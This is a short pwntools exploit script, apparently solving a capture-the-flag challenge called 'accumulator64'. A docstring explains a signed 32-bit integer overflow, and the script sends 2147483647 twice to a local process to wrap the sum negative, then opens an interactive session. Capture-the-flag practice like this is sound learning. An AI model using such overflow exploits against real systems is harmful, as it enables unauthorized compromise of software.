#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template accumulator64
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'accumulator64')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main+109
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

"""
main+94 error reading scanf int
+main+113 if negative input

This is an integer overflow.
Minimum value: - 2^31 = -2,147,483,648
The binary use int32, there for the max int32 is 2^31 - 1 = 2147483647
If we add 1 to 2147483647, its already overflow to minimum int32.

Maximum int32 value: 2,147,483,647 in binary is 01111111 11111111 11111111 11111111.
Adding 1: When you add 1 to this value, the binary becomes 10000000 00000000 00000000 00000000.
In a 32-bit signed integer, the most significant bit (MSB) is used as the sign bit:

0 indicates a positive number.
1 indicates a negative number.

send addition of 2147483647 twice also make it negatives.
"""

io = start()

# shellcode = asm(shellcraft.sh())

payload = flat(
    "2147483647"
)

for i in range(2):
    io.sendline(payload)

# flag = io.recvline()
# log.success(flag)

io.interactive()

